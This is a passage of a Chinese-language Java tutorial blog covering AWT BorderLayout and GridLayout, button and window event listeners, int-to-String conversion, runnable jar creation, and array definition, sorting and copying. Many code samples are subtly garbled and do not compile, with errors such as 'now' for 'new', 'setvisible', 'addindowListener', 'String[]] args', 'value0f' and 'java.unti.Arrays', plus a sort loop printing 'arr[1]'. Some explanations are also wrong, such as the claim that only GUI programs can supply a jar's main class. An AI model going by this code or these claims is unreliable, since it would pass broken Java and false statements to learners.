Layout&quot;</span>);</span><br><span class="line">        Button bn = <span class="keyword">new</span> Button(<span class="string">&quot;BN&quot;</span>);</span><br><span class="line">        Button bs = <span class="keyword">new</span> Button(<span class="string">&quot;BS&quot;</span>);</span><br><span class="line">        Button bw = <span class="keyword">new</span> Button(<span class="string">&quot;BW&quot;</span>);</span><br><span class="line">        Button be = <span class="keyword">new</span> Button(<span class="string">&quot;BE&quot;</span>);</span><br><span class="line">        Button bc = <span class="keyword">new</span> Button(<span class="string">&quot;BC&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//也可使用下述语句</span></span><br><span class="line">        <span class="comment">//f.add(bn, BorderLayout.NORTH);</span></span><br><span class="line">        <span class="comment">//f.add(bs, BorderLayout.SOUTH);</span></span><br><span class="line">        <span class="comment">//f.add(bw, BorderLayout.WEST);</span></span><br><span class="line">        <span class="comment">//f.add(be，BorderLayout.EAST);</span></span><br><span class="line">        <span class="comment">//f.add(bc，BorderLayout.CENTER);</span></span><br><span class="line">        </span><br><span class="line">        f.setSize(<span class="number">200</span>,<span class="number">200</span>);</span><br><span class="line">        f.setvisible(<span class="keyword">true</span>);       </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="GridLayout布局管理器"><a href="#GridLayout布局管理器" class="headerlink" title="GridLayout布局管理器"></a>GridLayout布局管理器</h3><ul>
<li>GridLayout型布局管理器将空间划分成规则的<strong>矩形网格</strong>，每个单元格区域大小相等。组件被添加到每个单元格中，先从左到右添满一行后换行，再从上到下。</li>
<li>在GridLayout构造方法中指定分割的行数和列数：<ul>
<li>如: GridLayout(3,4)</li>
<li><strong>GridLayout是以行数为准的（格子排列）</strong></li>
</ul>
</li>
</ul>
<p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/GridLayout.png"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">GridLayout的构造函数</span></span><br><span class="line"><span class="comment">	public GriLayout(int, int);的用法</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">import</span> java. awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestGridLayout</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="function">now <span class="title">Frame</span><span class="params">(<span class="string">&quot;GridLayout Example&quot;</span>)</span></span>;</span><br><span class="line">        Button b1 = <span class="keyword">new</span> Button(<span class="string">&quot;b1&quot;</span>);</span><br><span class="line">        Button b2 = <span class="keyword">new</span> Button(<span class="string">&quot;b2&quot;</span>);</span><br><span class="line">        Button b3 = <span class="keyword">new</span> Button(<span class="string">&quot;b3&quot;</span>);</span><br><span class="line">        Button b4 = <span class="keyword">new</span> Button(<span class="string">&quot;b4&quot;</span>);</span><br><span class="line">        Button b5 = <span class="keyword">new</span> Button(<span class="string">&quot;b5&quot;</span>);</span><br><span class="line">        <span class="comment">//Button b6 = new Button(&quot;b6&quot;);</span></span><br><span class="line">        </span><br><span class="line">        f.setLayout(<span class="keyword">new</span> GridLayout(<span class="number">2</span>,<span class="number">3</span>)); <span class="comment">//第一个参数是多少，则输出的就是多少行，列数是编译器根据行数自动计算出来的 (行数是一定的，但是列数不一定)</span></span><br><span class="line">     </span><br><span class="line">        f.add(b1);</span><br><span class="line">    	f.add(b2);</span><br><span class="line">        f.add(b3);</span><br><span class="line">        f.add(b4);</span><br><span class="line">        f.add(b5);</span><br><span class="line">        <span class="comment">//f.add(b6);</span></span><br><span class="line">        </span><br><span class="line">    	f.pack(); <span class="comment">//如果把该语句注释掉，则输出结果就变成一个只有标题的小窗口，摘自API: “pack() – 类 java.awt.Window 中的方法，调整此窗口的大小，以适合其子组件的首选大小和布局”，郝斌:也就是把子组件包括起来，会根据它所容纳的子组件的大小自动调整自身的大小，把子组件包括起来</span></span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="布局管理器总结"><a href="#布局管理器总结" class="headerlink" title="布局管理器总结"></a>布局管理器总结</h3><ul>
<li>Frame是一个顶级窗口，Frame的缺省布局管理器为BorderLayout</li>
<li>Panel无法单独显示，必须添溯到某个容器中。<ul>
<li><strong>Panel的缺省布局管理器为FlowLayout。</strong></li>
</ul>
</li>
<li>当把Panel作为一个组件添加到某个容器中后，该Panel仍然可以有自己的布局管理器。</li>
<li>使用布局管理器时，布局管理器负责各个组件的大小和位置，因此用户无法在这种情况下设置组件天小和位置属性，如果试图使用Java语言提供的<code>setLocation()</code>，<code>setSize()</code>，<code>setBounds()</code>等方法，则都会被布局管理器覆盖。</li>
<li>如果用户确实需要亲自设置组件大小或位置，则应取消该容器的布局管理器，方法为：<ul>
<li><code>setLayout(null)</code></li>
</ul>
</li>
</ul>
<h1 id="事件处理-（点击按钮有反应）"><a href="#事件处理-（点击按钮有反应）" class="headerlink" title="事件处理 （点击按钮有反应）"></a>事件处理 （点击按钮有反应）</h1><h2 id="事件处理相关概念"><a href="#事件处理相关概念" class="headerlink" title="事件处理相关概念"></a>事件处理相关概念</h2><ul>
<li>事件(Event)<ul>
<li>用户对组件的一个操作,称之为一个事件</li>
</ul>
</li>
<li>事件源(Event Source)<ul>
<li>能够产生事件的GUI组件对象，如按钮、文本框等。</li>
</ul>
</li>
<li>事件处理方法(Event Handler)<ul>
<li>能够接收、解析和处理事件类对象,实现与用户交互功能的方法。</li>
</ul>
</li>
<li>事件监听器(Event Listener) 【<strong>用户是否点击，调用事件处理方法</strong>】<ul>
<li>可以处理事件的一个类。</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java. awt.*;</span><br><span class="line"><span class="keyword">import</span> java. awt.eventl*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestButton</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Frame f = <span class="keyword">new</span> Frame();</span><br><span class="line">        Button bn =<span class="function">now <span class="title">Button</span><span class="params">(<span class="string">&quot;OK&quot;</span>)</span></span>;</span><br><span class="line">        f.add(bn);</span><br><span class="line">        A aa = <span class="keyword">new</span> A();</span><br><span class="line">        </span><br><span class="line">        bn.addActionListener(aa);</span><br><span class="line">        </span><br><span class="line">        f.pack();</span><br><span class="line">        f.addindowListener(<span class="keyword">new</span> B()); <span class="comment">//f这个窗口，注册一个监听</span></span><br><span class="line">        </span><br><span class="line">        f.setVisible(<span class="keyword">true</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> <span class="keyword">implements</span> <span class="title">Actionlistener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">actionPerformed</span><span class="params">(ActionEvent e)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    	System.out.println(<span class="string">&quot;今天我很爽!&quot;</span>);</span><br><span class="line">        <span class="comment">//System.exit(-1);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> <span class="keyword">extends</span> <span class="title">WindowAdapter</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">windowClosing</span><span class="params">(WindowEvent e)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		System.exit(-<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​    要对某个事件进行处理就add这个事件的名字后面加监听器，括号是对那个对象进行监听，a对象之所以可以监听是因为<strong>实现了接口的方法</strong></p>
<p>​    B本应该写<code>implements</code>，但如果写<code>implements</code>只重写一个接口，那个类还是抽象类，抽象类的抽象方法都要实现，所以写<code>extends</code></p>
<p>​    一个组件要想让他产生反应，添加一个相应组件的监听器，括号写的是实现监听器接口的对象</p>
<h2 id="事件处理步骤"><a href="#事件处理步骤" class="headerlink" title="事件处理步骤"></a>事件处理步骤</h2><p>假设事件为XXXX</p>
<p>​    1.向事件源注册某种事件的事件监听器对象</p>
<p>​          <code>addXXXXListener(..…);</code></p>
<p>​    2.设计好可以处理这种事件的事件监听器</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 类名 <span class="keyword">implements</span> <span class="title">XXXXListener</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	重写XXXXListener接口中的方法</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>说明<br>要想设计出能够处理 XXXX 事件的监听器，只需要编写出实现了 XXXXListener 接口的类就OK了，因为 XXXXListener 接口中已经定义了可以处理 XXXX 事件的方法</p>
<h2 id="事件处理相关概念-1"><a href="#事件处理相关概念-1" class="headerlink" title="事件处理相关概念"></a>事件处理相关概念</h2><ul>
<li>默认情况下事件源不会自动产生任何事件，程序员需要做两件事：<ul>
<li><strong>告诉事件源可以自动产生哪类事件</strong>，即：向事件源注册某种事件的事件监听器对象</li>
<li><strong>设计好可以处理这种事件的事件监听器</strong></li>
</ul>
</li>
<li>一旦完成了这两步操作，当用户对事件源进行操作时，事件源就会自动产生事件，事件源就会自动把产生的事件封装成一个事件对象，事件源就会自动把封装好的事件对象传递给事件监听器</li>
<li>事件监听器收到事件源发送过来的事件时，事件监听器就会自动调用相应的事件处理方法来对该事件进行相应的处理</li>
</ul>
<h2 id="事件处理示意图"><a href="#事件处理示意图" class="headerlink" title="事件处理示意图"></a>事件处理示意图</h2><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86%E7%A4%BA%E6%84%8F%E5%9B%BE.png"></p>
<p><strong>注册和实现某种监听器接口的类对象</strong>这两步是由程序员完成的,其他步骤由编译器自动完成</p>
<h2 id="TestField监听器"><a href="#TestField监听器" class="headerlink" title="TestField监听器"></a>TestField监听器</h2><p><img src="/2021/04/18/Java-8%E5%9B%BE%E5%BD%A2%E5%8C%96%E7%95%8C%E9%9D%A2/TestField%E7%9B%91%E5%90%AC%E5%99%A8.png"></p>
<p><code>@OVerride</code>：告诉编译器下面的方法是程序员重写父类的方法，不是自己定义的，如果写成了定义就会报错</p>
<h2 id="文本转字符串转"><a href="#文本转字符串转" class="headerlink" title="文本转字符串转"></a>文本转字符串转</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestInt</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[]] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> i = <span class="number">345</span>;</span><br><span class="line">        String str; </span><br><span class="line">        <span class="comment">//第一种方法</span></span><br><span class="line">        str = i + <span class="string">&quot;&quot;</span>;</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第二种</span></span><br><span class="line">        Integer it = <span class="function">now <span class="title">Integer</span><span class="params">(i)</span></span>;</span><br><span class="line">        str = it.toString();</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第三种</span></span><br><span class="line">        str = Integer.toString(i);</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第四种</span></span><br><span class="line">        str = String.value0f(i);</span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//第五种:本方法不对</span></span><br><span class="line">		str = i; <span class="comment">//error 不兼容</span></span><br><span class="line">        System.out.println(<span class="string">&quot;str = &quot;</span> + str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="可运行jar包生成步骤"><a href="#可运行jar包生成步骤" class="headerlink" title="可运行jar包生成步骤"></a>可运行jar包生成步骤</h1><ol>
<li><p>新建一个记事本文件，假设为1.xt，文件内容：</p>
<p>​    Main-Class：可运行类的名字<br>​    附注：记着敲回车</p>
</li>
<li><p>dos下命令:<br><code>jar cvfm haha.jar 1.txt*.class</code></p>
<p>记住:</p>
<p>只有GUI程序生成的class文件才可以作为main  class</p>
</li>
</ol>
 
      <!-- reward -->
      
    </div>
    

    <!-- copyright -->
    
    <footer class="article-footer">
       
    </footer>
  </div>

    
 
    
</article>

    
    <article
  id="post-Java-7数组"
  class="article article-type-post"
  itemscope
  itemprop="blogPost"
  data-scroll-reveal
>
  <div class="article-inner">
    
    <header class="article-header">
       
<h2 itemprop="name">
  <a class="article-title" href="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/"
    >Java 7数组</a> 
</h2>
 

    </header>
     
    <div class="article-meta">
      <a href="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/" class="article-date">
  <time datetime="2021-04-18T12:04:13.000Z" itemprop="datePublished">2021-04-18</time>
</a> 
  <div class="article-category">
    <a class="article-category-link" href="/categories/Java/">Java</a>
  </div>
   
    </div>
      
    <div class="article-entry" itemprop="articleBody">
       
  <h1 id="定义数组"><a href="#定义数组" class="headerlink" title="定义数组"></a>定义数组</h1><p><strong>数组赋值时前后框框不能有数值</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> stat ic <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//方式一</span></span><br><span class="line">	<span class="keyword">int</span>[] arr1;</span><br><span class="line">	arr1 = <span class="keyword">new</span> <span class="keyword">int</span> [<span class="number">3</span>];</span><br><span class="line">    arr1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	arr1[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">    arr1[<span class="number">2</span>] = <span class="number">2</span>;</span><br><span class="line">    showArr(arr1);</span><br><span class="line">	System.<span class="function">out <span class="title">println</span><span class="params">(<span class="string">&quot;**********************&quot;</span>)</span></span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方式二</span></span><br><span class="line">	<span class="keyword">int</span>[] arr2 = now <span class="keyword">int</span>[]&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>&#125;;</span><br><span class="line">    showArr(arr2) ;</span><br><span class="line">	System.out.println(<span class="string">&quot;************************&quot;</span>);</span><br><span class="line">	<span class="comment">//System.out.printin(arr1); //error 一维数组的内容是不能通过System.out.printin(arr1)直接输出</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//int[3] arr3 = new int[]&#123;0,1,2&#125;; //error</span></span><br><span class="line">	<span class="comment">//int[] arr4 = new int[3]&#123;0, 1,2&#125;; //error </span></span><br><span class="line">    <span class="comment">//int[3] arr5 = new int[3]&#123;0,1,2&#125;; //error</span></span><br><span class="line">    <span class="comment">//数组赋值时前后框框不能有数值</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">//方式三</span></span><br><span class="line">	<span class="keyword">int</span>[] arr6 = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>&#125;; <span class="comment">//25行</span></span><br><span class="line">    showArr(arr6);</span><br><span class="line">	System.out.println(<span class="string">&quot;**********************&quot;</span>);</span><br><span class="line">	arr6 = <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;<span class="number">5</span>,<span class="number">4</span>, <span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;; <span class="comment">//arr6本来是指向25行的&#123;1,2,3&#125;</span></span><br><span class="line">    showArr(arr6);</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">showArr</span><span class="params">(<span class="keyword">int</span>[] arr)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;arr.length; ++i)</span><br><span class="line">			System.out.println(arr[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h1 id="创建并使用基本类型数组示意图"><a href="#创建并使用基本类型数组示意图" class="headerlink" title="创建并使用基本类型数组示意图"></a>创建并使用基本类型数组示意图</h1><p>星星为程序运行处</p>
<p>图一</p>
<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%841.png"></p>
<p>图二</p>
<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%842.png"></p>
<p>图三</p>
<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%9F%BA%E6%9C%AC%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%843.png"></p>
<h1 id="创建并使用引用类型数组"><a href="#创建并使用引用类型数组" class="headerlink" title="创建并使用引用类型数组"></a>创建并使用引用类型数组</h1><p>图一</p>
<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%841.png"></p>
<p>图二</p>
<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%842.png"></p>
<p>图三</p>
<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%843.png"></p>
<p>图四</p>
<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E5%BC%95%E7%94%A8%E7%B1%BB%E5%9E%8B%E6%95%B0%E7%BB%844.png"></p>
<p>​    <strong>引用类型元素组成的一维数组在使用过程中一般存在着两级的指向关系，这是理解多维不等长数组的基础</strong></p>
<h1 id="多维数组"><a href="#多维数组" class="headerlink" title="多维数组"></a>多维数组</h1><p>举例</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[][] xx = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>][<span class="number">3</span>]; <span class="comment">//等长数组</span></span><br><span class="line"><span class="keyword">int</span>[][] xx = &#123;&#123;<span class="number">3</span>,<span class="number">2</span>,<span class="number">7</span>&#125;,&#123;<span class="number">1</span>,<span class="number">5</span>&#125;,&#123;<span class="number">6</span>&#125;; <span class="comment">//不等长数组</span></span><br></pre></td></tr></table></figure>

<p><img src="/2021/04/18/Java-7%E6%95%B0%E7%BB%84/%E4%B8%8D%E7%AD%89%E9%95%BF%E6%95%B0%E7%BB%84%E4%BE%8B%E5%AD%90.png"></p>
<h1 id="数组的排序"><a href="#数组的排序" class="headerlink" title="数组的排序"></a>数组的排序</h1><p><code>java.unti.Arrays类</code>中的<code>sort方法</code>可以实现对数组的排序</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span>[] a = &#123;<span class="number">6</span>,<span class="number">23</span>,<span class="number">45</span>,<span class="number">12</span>,-<span class="number">83</span>,<span class="number">94</span>,<span class="number">41</span>&#125;;<span class="comment">//创建样本数组</span></span><br><span class="line"></span><br><span class="line">Arrays.sort(a); <span class="comment">//数组排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//排序后将数组元素输出</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;a.length; i++)</span><br><span class="line">&#123;</span><br><span class="line">	System.out.print(arr[<span class="number">1</span>]+<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">______________________________________</span><br><span class="line">    输出结果：</span><br><span class="line">    -<span class="number">83</span> <span class="number">6</span> <span class="number">12</span> <span class="number">23</span> <span class="number">41</span> <span class="number">45</span> <span class="number">94</span></span><br></pre></td></tr></table></figure>

<h1 id="数组的拷贝"><a href="#数组的拷贝" class="headerlink" title="数组的拷贝"></a>数组的拷贝</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">arraycopy</span><span class="params">( Object arr1, <span class="keyword">int</span> pos1, Object arr2, <span class="keyword">int</span> pos2, <span class="keyword">int</span> length)</span></span>;</span><br><span class="line">将arr1所指向的数组中下标从pos1开始的总共length个元素</span><br><span class="line">覆盖掉arr2所指向的数组中从pos2开始的length个元素</span><br></pre></td></tr></table></figure>

<p>注意:<br>    arr1是源数组  arr2是目的数组!   arraycopy()全是小写，不能是大写!</p>
<p>例子：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> source[] = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;; <span class="comment">//源数组</span></span><br><span class="line"><span class="keyword">int</span> dest[] = &#123;<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">1</span>&#125;; <span class="comment">//目的数组</span></span><br><span class="line"></span><br><span class="line">System.arraycopy(source,<span class="number">0</span>,dest,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="comment">//将source数组中下标从0开始的总共3个元素的值复制给dest数组中下标从2开始的3个元素</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// System.arraycpoy(); 的用法</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestArrayCopy</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;;</span><br><span class="line">		<span class="keyword">int</span>[] b = i1,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,5j:</span><br><span class="line">		System.arraycopy(a, <span class="number">0</span>, b, <span class="number">1</span>, <span class="number">2</span>); </span><br><span class="line">        System.out.println(<span class="string">&quot;a = &quot;</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;a.length; ++i)</span><br><span class="line">        &#123;</span><br><span class="line">			System.out.println(a[i]);</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestArraysSort_1</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] data = &#123;<span class="number">1</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">2</span>,<span class="number">4</span>,<span class="number">6</span>,<span class="number">8</span>,<span class="number">10</span>,<span class="number">9</span>&#125;;</span><br><span class="line">        System.out.println(<span class="string">&quot;排序前数组data中的内容是:&quot;</span>);</span><br><span class="line">        showArray(data);</span><br><span class="line">        </span><br><span class="line">        Arrays.sort(data);</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;排序后数组data中的内容是:&quot;</span>);</span><br><span class="line">        showArray(data);</span><br><span class="line">    &#125;</span><br><span class="line">    